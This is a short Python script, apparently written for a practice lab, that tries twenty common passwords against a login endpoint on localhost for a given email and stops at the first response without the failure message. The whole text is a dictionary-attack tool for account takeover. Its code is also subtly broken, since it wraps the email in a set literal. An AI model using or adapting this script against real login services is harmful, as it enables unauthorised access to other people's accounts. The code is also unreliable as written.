import requests # pip install requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("email", help="Target's email")
parser.add_argument("-p", help="port number of the server", default=8000)
args = parser.parse_args()

most_common_passwords = [
    "guest",
    "123456",
    "password",
    "12345",
    "a1b2c3",
    "123456789",
    "Password1",
    "1234",
    "abc123",
    "12345678",
    "qwerty",
    "baseball",
    "football",
    "unknown",
    "soccer",
    "jordan23",
    "iloveyou",
    "monkey",
    "shadow",
    "g_czechout"
]

url = f'http://localhost:{args.p}/login'

for p in most_common_passwords:
    print("Try: " + p)
    payload = {'email': {args.email}, 'password': p}
    r = requests.post(url, data=payload)
    if r.text.find("Email or password incorrect") == -1:
        print("Successful login!")
        break
    else:
        print("Failed login!")